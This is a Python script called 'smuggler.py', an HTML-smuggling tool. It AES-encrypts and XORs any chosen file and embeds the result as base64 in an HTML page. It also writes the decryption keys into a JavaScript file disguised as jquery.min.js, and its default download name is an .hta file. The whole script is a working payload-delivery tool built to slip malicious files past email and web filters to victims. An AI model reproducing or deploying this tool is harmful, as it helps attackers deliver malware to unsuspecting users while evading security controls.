import base64
import shutil
import hashlib
import mimetypes
from itertools import cycle
from Crypto.Cipher import AES
from argparse import ArgumentParser, FileType
from os import urandom, getcwd, remove, makedirs


def encryptfile(infile, mypassword):
	with open(infile, "rb") as infile:
		pbkdf2iterations = 10000

		print('Password:', mypassword)
		passwordbytes = mypassword.encode('utf-8')

		salt = urandom(16 - len('Salted__'))
		print('Salt:', salt.hex())

		derivedkey = hashlib.pbkdf2_hmac('sha256', passwordbytes, salt, pbkdf2iterations, 48)

		key = derivedkey[0:32]
		print('Key:', key.hex())

		iv = derivedkey[32:48]
		print('IV:', iv.hex())

		blocksize = AES.block_size
		encryptor = AES.new(key, AES.MODE_CBC, iv)
		outfile = b'Salted__' + salt

		finished = False
		while not finished:
			chunk = infile.read(1024 * blocksize)

			if len(chunk) == 0 or len(chunk) % blocksize != 0:
				padding_length = (blocksize - len(chunk) % blocksize) or blocksize
				chunk += str.encode(padding_length * chr(padding_length))
				finished = True

			outfile += encryptor.encrypt(chunk)
		return outfile


def xorfile(infile, key):
	print('XOR Key:', key)
	xorfile = bytes(a ^ b for a, b in zip(infile, cycle(key.encode('utf-8'))))
	return xorfile


def writeDataHtml(infile):
	with open("./output/data.html", "w") as outfile:
		inbytes = infile
		inb64 = base64.b64encode(inbytes).decode('utf-8')
		toWrite = "<!DOCTYPE html><html><body>" + inb64 + "</body></html>"
		outfile.write(toWrite)


def writeInitialDownloadPage():
	shutil.copyfile("./templates/index.html", "./output/index.html")


def writeJavascript(enckey, xorkey, fname, ctype):
	makedirs("./output/js", exist_ok=True)

	with open("./templates/js/jquery.min.js", "r") as templjs, open("./output/js/jquery.min.js", "w") as outjs:
		myjs = templjs.read().strip()
		myjs = myjs.replace("__ENCRYPTION_KEY__", enckey).replace("__XOR_KEY__", xorkey).replace("__FILE_NAME__", fname).replace("__CONTENT_TYPE__", ctype)
		outjs.write(myjs)


def main(initialFile, encryptionKey, xorKey, fileName, contentType):
	if contentType == "defaultmime":
		contentType = mimetypes.guess_type(initialFile)[0]
		print('MIME Type:', contentType)

	encryptedFile = encryptfile(initialFile, encryptionKey)
	xoredFile = xorfile(encryptedFile, xorKey)

	writeDataHtml(xoredFile)
	writeInitialDownloadPage()
	writeJavascript(encryptionKey, xorKey, fileName, contentType)


def checkArgumentValidity(parser, args):
	if not args.file:
		parser.print_usage()
		print("No file specified")
		return False

	else:
		return True


if __name__ == "__main__":
	parser = ArgumentParser(prog="smuggler.py", description="HTML Smuggler")
	parser.add_argument("file", help="File to smuggle")
	parser.add_argument("-p", "--pass", action="store", dest="encpass", help="Encryption pass", default="p4$$w0rd")
	parser.add_argument("-x", "--xor", action="store", dest="xorpass", help="XOR pass", default="P@ssw0rD")
	parser.add_argument("-n", "--name", action="store", dest="fname", help="File name for download", default="myfilename.hta")
	parser.add_argument("-t", "--type", action="store", dest="ftype", help="File type for download", default="defaultmime")
	args = parser.parse_args()

	if not checkArgumentValidity(parser, args):
		exit(1)

	main(args.file, args.encpass, args.xorpass, args.fname, args.ftype)
